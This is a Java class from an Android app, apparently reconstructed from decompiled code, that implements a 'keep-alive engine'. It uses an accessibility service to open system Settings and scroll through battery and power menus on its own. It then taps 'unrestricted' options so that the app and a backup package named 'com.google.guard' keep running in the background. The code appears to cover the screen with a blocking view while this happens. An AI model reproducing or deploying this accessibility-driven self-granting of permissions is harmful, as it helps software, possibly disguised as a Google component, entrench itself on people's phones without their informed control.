package com.guard.wallet.engine;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.delegate.FilterHelper;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * AOSP/Samsung/generic 保活引擎。
 *
 * 处理通用 Android 保活:
 * - 应用详情 -> 电池管理 -> 不受限制用量
 * - 滚动查找设置中的电池/电源项
 *
 * ListenWindows: com.android.settings (多种 Activity 类型)
 *
 * vendor 原始路径: o/g.java
 */
public final class AospKeepAliveEngine extends KeepAliveEngine {

    public static final int v = 0;

    // ADAPT: cache enum values to avoid r.e.X (field 'r' shadows class o.r)
    private static final Object KEEP_ALIVE_UNKNOWN = EngineHelper.KEEP_ALIVE_UNKNOWN;
    private static final Object KEEP_ALIVE_MAIN = EngineHelper.KEEP_ALIVE_MAIN;
    private static final Object KEEP_ALIVE_BACKUP = EngineHelper.KEEP_ALIVE_BACKUP;

    /** KeepAlive state: UNKNOWN -> MAIN_APP -> BACKUP_APP */
    public final AtomicReference r = new AtomicReference<>(KEEP_ALIVE_UNKNOWN);

    /** Full background unrestricted */
    public final AtomicBoolean s = new AtomicBoolean(false);
    /** Auto-start allowed */
    public final AtomicBoolean t = new AtomicBoolean(false);
    /** Associate-start allowed */
    public final AtomicBoolean u = new AtomicBoolean(false);

    public AospKeepAliveEngine() {
        super(buildAllListenWindows(), "com.android.settings");
        try {
            this.p.schedule(new com.guard.wallet.delegate.task.PermissionGrantTask(this, 2), 30L, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AppUtils.s("o.g", e2);
        }
    }

    // ======= Static CombineFilter builders =======

    /** vendor 原名: b0() — Filter: COMMON_ALLOW_BACKGROUND_USAGE_TEXT (may return null) */
    public static CombineFilter buildAllowBackgroundFilter() {
        String text = com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_ALLOW_BACKGROUND_USAGE_TEXT");
        if (AppUtils.B(text)) {
            return null;
        }
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addConditionWithEquals(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"),
                "text", text);
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: c0() — Filter: COMMON_SETTINGS_BATTERY_TEXT (may return null) */
    public static CombineFilter buildBatteryFilter() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_BATTERY_TEXT"))) {
            return null;
        }
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_BATTERY_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: f0() — Filter: COMMON_SETTINGS_POWER_TEXT (may return null) */
    public static CombineFilter buildPowerFilter() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_POWER_TEXT"))) {
            return null;
        }
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_POWER_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: g0() — Filter: COMMON_SETTINGS_USE_POWER_TEXT (may return null) */
    public static CombineFilter buildUsePowerFilter() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_USE_POWER_TEXT"))) {
            return null;
        }
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_USE_POWER_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /**
     * vendor 原名: o0() — Or-filter for unrestricted battery usage options.
     * Matches: UNRESTRICTED_TEXT, NO_RESTRICTED_TEXT, HAS_CANCEL_RESTRICTED_TEXT
     */
    public static CombineFiltersWithOr buildUnrestrictedOrFilter() {
        CombineFiltersWithOr result = new CombineFiltersWithOr();
        result.setFilters(new LinkedList<>());

        /* Filter 1: COMMON_SETTINGS_UNRESTRICTED_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_UNRESTRICTED_TEXT"))) {
            CombineFilter cf1 = new CombineFilter();
            StringCondition sc1 = FilterHelper.addCondition(cf1,
                    FilterHelper.initFilter(cf1, "className", "android.widget.TextView"), "text");
            sc1.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_UNRESTRICTED_TEXT"));
            cf1.getStringConditions().add(sc1);
            result.getFilters().add(cf1);
        }

        /* Filter 2: COMMON_SETTINGS_NO_RESTRICTED_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_NO_RESTRICTED_TEXT"))) {
            CombineFilter cf2 = new CombineFilter();
            StringCondition sc2 = FilterHelper.addCondition(cf2,
                    FilterHelper.initFilter(cf2, "className", "android.widget.TextView"), "text");
            sc2.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_NO_RESTRICTED_TEXT"));
            cf2.getStringConditions().add(sc2);
            result.getFilters().add(cf2);
        }

        /* Filter 3: COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"))) {
            CombineFilter cf3 = new CombineFilter();
            StringCondition sc3 = FilterHelper.addCondition(cf3,
                    FilterHelper.initFilter(cf3, "className", "android.widget.TextView"), "text");
            sc3.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"));
            cf3.getStringConditions().add(sc3);
            result.getFilters().add(cf3);
        }

        return result;
    }

    // ======= Static ListenWindow builders =======

    /** vendor 原名: d0() — ListenWindow: com.android.settings / SubSettings */
    public static ListenWindow buildSubSettingsListenWindow() {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor 原名: e0() — ListenWindow: com.android.settings / InstalledAppDetailsTop */
    public static ListenWindow buildAppDetailsListenWindow(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.applications.InstalledAppDetailsTop");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(EngineHelper.cH(appName));
        return lw;
    }

    /** vendor 原名: j0() — ListenWindow: com.android.settings / FrameLayout */
    public static ListenWindow buildFrameLayoutListenWindow(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(EngineHelper.cH(appName));
        return lw;
    }

    /** vendor 原名: m0() — ListenWindow: com.android.settings / SpaActivity */
    public static ListenWindow buildSpaActivityListenWindow(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.android.settings.spa.SpaActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(EngineHelper.cH(appName));
        return lw;
    }

    /** vendor 原名: k0() — Build full ListenWindow list for AOSP engine */
    public static LinkedList buildAllListenWindows() {
        LinkedList list = new LinkedList();
        list.add(EngineHelper.cJ());
        list.add(buildAppDetailsListenWindow(com.guard.wallet.utils.SystemHelper.x0()));
        list.add(buildAppDetailsListenWindow(com.guard.wallet.utils.SystemHelper.e()));
        list.add(buildSpaActivityListenWindow(com.guard.wallet.utils.SystemHelper.x0()));
        list.add(buildSpaActivityListenWindow(com.guard.wallet.utils.SystemHelper.e()));
        list.add(buildFrameLayoutListenWindow(com.guard.wallet.utils.SystemHelper.x0()));
        list.add(buildFrameLayoutListenWindow(com.guard.wallet.utils.SystemHelper.e()));
        list.add(buildSubSettingsListenWindow());
        return list;
    }

    // ======= Window detection helpers =======

    /** vendor 原名: h0() — Check if in SubSettings (battery management) window */
    public final boolean isInBatteryManagement() {
        try {
            if (this.q(Collections.singletonList(buildSubSettingsListenWindow()))) {
                Log.d("o.g", "已进入App耗电管理窗口");
                return true;
            }
        } catch (Exception e2) {
            AppUtils.s("o.g", e2);
        }
        return false;
    }

    /** vendor 原名: i0() — Check if in app detail window */
    public final boolean isInAppDetail() {
        try {
            String appName = Objects.equals(this.r.get(), KEEP_ALIVE_MAIN)
                    ? com.guard.wallet.utils.SystemHelper.x0() : com.guard.wallet.utils.SystemHelper.e();
            LinkedList list = new LinkedList();
            list.add(buildAppDetailsListenWindow(appName));
            list.add(buildSpaActivityListenWindow(appName));
            list.add(buildFrameLayoutListenWindow(appName));
            if (this.q(list)) {
                Log.d("o.g", "已进入App详情窗口");
                return true;
            }
            return false;
        } catch (Exception e2) {
            AppUtils.s("o.g", e2);
            return false;
        }
    }

    // ======= Scroll-and-find battery management item =======

    /**
     * vendor 原名: l0() — scroll through settings to find battery/power management entry.
     * Searches for: buildBatteryFilter, buildPowerFilter, buildUsePowerFilter.
     * Scrolls forward first, then backward, up to 10 times each direction.
     */
    public final UiObject scrollFindBatteryEntry(UiObject scrollView) {
        UiObject batteryItem = null;
        UiObject powerItem = null;
        UiObject usePowerItem = null;
        try {
            scrollView.refresh();
            Log.d("o.g", "开始滚动电池电量管理栏目");
            CombineFilter batteryFilter = buildBatteryFilter();
            CombineFilter powerFilter = buildPowerFilter();
            CombineFilter usePowerFilter = buildUsePowerFilter();
            AtomicInteger scrollCount = new AtomicInteger(0);

            /* All null — nothing to search for */
            if (batteryFilter == null && powerFilter == null && usePowerFilter == null) {
                return null;
            }

            /* Initial find attempts */
            if (batteryFilter != null) {
                batteryItem = scrollView.findOneByCombine(batteryFilter);
            }
            if (powerFilter != null) {
                powerItem = scrollView.findOneByCombine(powerFilter);
            }
            if (usePowerFilter != null) {
                usePowerItem = scrollView.findOneByCombine(usePowerFilter);
            }

            /* Scroll forward to find items */
            while (scrollView.canScrollForward()
                    && scrollCount.incrementAndGet() < 10) {
                Log.d("o.g", "滚动视图可以向下滚动");

                /* If any item is visible, stop */
                if (batteryItem != null && batteryItem.visibleToUser()) break;
                if (powerItem != null && powerItem.visibleToUser()) break;
                if (usePowerItem != null && usePowerItem.visibleToUser()) break;

                if (!scrollView.scrollForwardByGesture()) continue;
                Log.d("o.g", "向下滚动查找电池电量管理栏目");
                com.guard.wallet.utils.SystemHelper.T0(10);
                scrollView.refresh();

                if (batteryFilter != null) {
                    batteryItem = scrollView.findOneByCombine(batteryFilter);
                }
                if (powerFilter != null) {
                    powerItem = scrollView.findOneByCombine(powerFilter);
                }
                if (usePowerFilter != null) {
                    usePowerItem = scrollView.findOneByCombine(usePowerFilter);
                }
            }

            scrollCount.set(0);

            /* Scroll backward to find items */
            while (scrollView.canScrollBackward()
                    && scrollCount.incrementAndGet() < 10) {
                Log.d("o.g", "滚动视图可以向上滚动");

                if (batteryItem != null && batteryItem.visibleToUser()) break;
                if (powerItem != null && powerItem.visibleToUser()) break;
                if (usePowerItem != null && usePowerItem.visibleToUser()) break;

                if (!scrollView.scrollBackwardByGesture()) continue;
                Log.d("o.g", "向上滚动查找电池电量管理栏目");
                com.guard.wallet.utils.SystemHelper.T0(10);
                scrollView.refresh();

                if (batteryFilter != null) {
                    batteryItem = scrollView.findOneByCombine(batteryFilter);
                }
                if (powerFilter != null) {
                    powerItem = scrollView.findOneByCombine(powerFilter);
                }
                if (usePowerFilter != null) {
                    usePowerItem = scrollView.findOneByCombine(usePowerFilter);
                }
            }
        } catch (Exception e2) {
            AppUtils.s("o.g", e2);
        }

        /* Return first non-null result, prioritizing usePower > power > battery */
        if (usePowerItem != null) return usePowerItem;
        if (powerItem != null) return powerItem;
        return batteryItem;
    }

    // ======= Strategy save =======

    /** vendor 原名: n0() — Save keep-alive strategy for given package */
    public final void savePowerControlState(String pkg) {
        try {
            PowerControlStateVO state = com.guard.wallet.utils.SharedPrefsManager.k(pkg);
            state.setPackageName(pkg);
            if (this.s.get()) {
                state.setAllowAllFullBackground(this.s.get());
            }
            if (this.t.get()) {
                state.setAllowAutoStart(this.t.get());
            }
            if (this.u.get()) {
                state.setAllowRelateStart(this.u.get());
            }
            state.setRetryCount(state.getRetryCount() + 1);
            com.guard.wallet.utils.SharedPrefsManager.L(state);
            Log.d("o.g", "已保存本地保活策略".concat("|").concat(pkg));
        } catch (Exception e2) {
            AppUtils.s("o.g", e2);
        }
    }

    // ======= Engine lifecycle =======

    @Override
    public final void Z() {
        ReentrantLock lock = this.o;
        if (lock.tryLock()) {
            try {
                if (!isEngineFinished()) {
                    Log.d("o.g", "准备结束本地保活自动化引擎");
                    markEngineRunning();
                    com.guard.wallet.helper.BlockViewManager.h(100);
                    if (MyAccessibilityService.P() != null) {
                        MyAccessibilityService.P().x();
                    }
                    AtomicReference stateRef = this.r;
                    if (Objects.equals(stateRef.get(), KEEP_ALIVE_MAIN)) {
                        savePowerControlState(MainApplication.getAppContext().getPackageName());
                    }
                    if (Objects.equals(stateRef.get(), KEEP_ALIVE_BACKUP)) {
                        savePowerControlState("com.google.guard");
                    }
                    this.p.shutdownNow();
                    com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
                    this.n.clear();
                    if (AppUtils.M()) {
                        com.guard.wallet.utils.SystemHelper.T0(5);
                    }
                    com.guard.wallet.helper.BlockViewManager.c();
                    Log.d("o.g", "已结束本地保活自动化引擎");
                    EngineHelper.cW();
                    this.d();
                }
            } catch (Exception e2) {
                AppUtils.s("o.g", e2);
            }
            lock.unlock();
        }
    }

    @Override
    public final void u(AccessibilityEvent event, String packageName, String className) {
        try {
            if (isEngineFinished()) {
                return;
            }
            if (event != null) {
                super.u(event, packageName, className);
            }
            boolean inAppDetail = isInAppDetail();
            String delegateId = this.c;
            ConcurrentLinkedQueue queue = this.n;

            if (inAppDetail) {
                queue.remove("keepAliveInAppBattery");
                if (!queue.contains("keepAliveInAppDetail")) {
                    queue.add("keepAliveInAppDetail");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PermissionGrantTask(this, 0), delegateId);
                }
            }
            // ADAPT: HyperOS 3 降级后 isInAppDetail()/isInBatteryManagement() 同属 com.android.settings 可能同时 true
            else if (isInBatteryManagement()) {
                queue.remove("keepAliveInAppDetail");
                if (!queue.contains("keepAliveInAppBattery")) {
                    queue.add("keepAliveInAppBattery");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PermissionGrantTask(this, 1), delegateId);
                }
            }
        } catch (Exception e2) {
            AppUtils.s("o.g", e2);
        }
    }
}
